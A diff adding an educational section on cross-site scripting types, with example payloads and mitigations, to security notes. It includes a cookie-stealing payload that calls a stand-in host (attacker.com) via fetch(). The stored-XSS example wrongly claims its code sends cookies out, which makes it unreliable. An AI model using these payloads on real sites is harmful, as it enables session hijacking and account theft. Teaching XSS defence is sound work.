@@ -457,6 +457,104 @@ Mitigations:
 
 ---
 
+### **Types of Cross-Site Scripting (XSS) Attacks**
+Cross-Site Scripting (**XSS**) is a web security vulnerability where an attacker injects **malicious JavaScript** into a trusted website, affecting other users. It can be used for **session hijacking, data theft, phishing, and account takeovers**.
+
+---
+
+## **✅ 1. Stored XSS (Persistent XSS)**
+🔹 **Malicious script is permanently stored** on the website’s database or backend system.  
+🔹 **Impact:** Every time a victim loads the page, the script executes automatically.  
+🔹 **Common Injection Points:** Comment sections, forums, user profiles, support tickets.  
+
+### **🔍 Example:**
+A **forum** allows users to post messages but does **not sanitize input**:
+```html
+<input type="text" name="comment">
+```
+An attacker posts:
+```html
+<script>document.cookie = 'stolen=' + document.cookie;</script>
+```
+📌 **When another user views the comment, their cookies get stolen** and sent to the attacker.  
+
+### **🛡️ Mitigation:**
+✅ **Escape & sanitize user input before storing it** (e.g., HTML entity encoding).  
+✅ **Use Content Security Policy (CSP)** to block inline scripts.  
+
+---
+
+## **✅ 2. Reflected XSS (Non-Persistent XSS)**
+🔹 The **malicious script is embedded in a URL** and executed when the victim clicks a **crafted link**.  
+🔹 **Impact:** Used in phishing attacks to steal credentials or inject malware.  
+🔹 **Common Injection Points:** Search bars, error messages, login forms.  
+
+### **🔍 Example:**
+A vulnerable search page **reflects user input in HTML without encoding**:
+```html
+Search: <input value="<?php echo $_GET['q']; ?>">
+```
+An attacker sends a **malicious link**:
+```
+https://example.com/search?q=<script>alert('Hacked');</script>
+```
+📌 **If a user clicks it, their browser executes the script.**  
+
+### **🛡️ Mitigation:**
+✅ **Use input validation & output encoding** (e.g., `htmlspecialchars()` in PHP).  
+✅ **Avoid reflecting raw user input in responses.**  
+
+---
+
+## **✅ 3. DOM-Based XSS**
+🔹 **JavaScript manipulates the DOM dynamically** to inject malicious scripts.  
+🔹 **Impact:** Unlike stored/reflected XSS, the attack happens **entirely in the browser** (client-side).  
+🔹 **Common Injection Points:** `document.write()`, `innerHTML`, `eval()`, `setTimeout()`.  
+
+### **🔍 Example:**
+A site dynamically updates content based on the URL hash:
+```js
+document.getElementById('output').innerHTML = location.hash;
+```
+An attacker tricks a user into visiting:
+```
+https://example.com/#<script>alert('XSS')</script>
+```
+📌 **If the page loads, the script runs in the victim’s browser.**  
+
+### **🛡️ Mitigation:**
+✅ **Avoid `innerHTML`, `eval()`, and use `textContent` instead.**  
+✅ **Use DOMPurify.js** to sanitize untrusted input.  
+
+---
+
+## **✅ 4. Blind XSS**
+🔹 **Variation of Stored XSS where the payload executes later, in an admin’s or internal system.**  
+🔹 **Impact:** Used for attacking administrators, stealing privileged accounts, or bypassing filters.  
+
+### **🔍 Example:**
+An attacker submits a malicious **support ticket**:
+```html
+<script>fetch('http://attacker.com/log?c='+document.cookie);</script>
+```
+📌 **When an admin reviews the ticket, their session cookies get stolen.**  
+
+### **🛡️ Mitigation:**
+✅ **Treat all user input as untrusted, even in admin panels.**  
+✅ **Enable HTTP-only cookies to prevent JavaScript from accessing session tokens.**  
+
+---
+
+## **🔥 Final Answer Summary**
+| **XSS Type** | **How It Works** | **Impact** | **Mitigation** |
+|-------------|-----------------|------------|----------------|
+| **Stored XSS** | Script is **stored in a database** and affects multiple users. | **Persistent account takeovers, data theft.** | **Sanitize input before storage, use CSP.** |
+| **Reflected XSS** | Script is **embedded in a malicious URL** and executed when clicked. | **Used in phishing, malware injections.** | **Validate & encode user input, disable inline scripts.** |
+| **DOM-Based XSS** | **Client-side JavaScript modifies the DOM**, executing the attack. | **Bypasses server-side sanitization, attacks users dynamically.** | **Avoid `innerHTML`, use `textContent`, implement CSP.** |
+| **Blind XSS** | Attack triggers in **backend/admin systems** where input is later executed. | **Compromises admin accounts, leads to deeper exploitation.** | **Sanitize all user input across all levels, enable HTTP-only cookies.** |
+
+Would you like a **hands-on demonstration of exploiting or preventing XSS attacks**? 🚀
+
 ## Insecure Design
 
 Description:
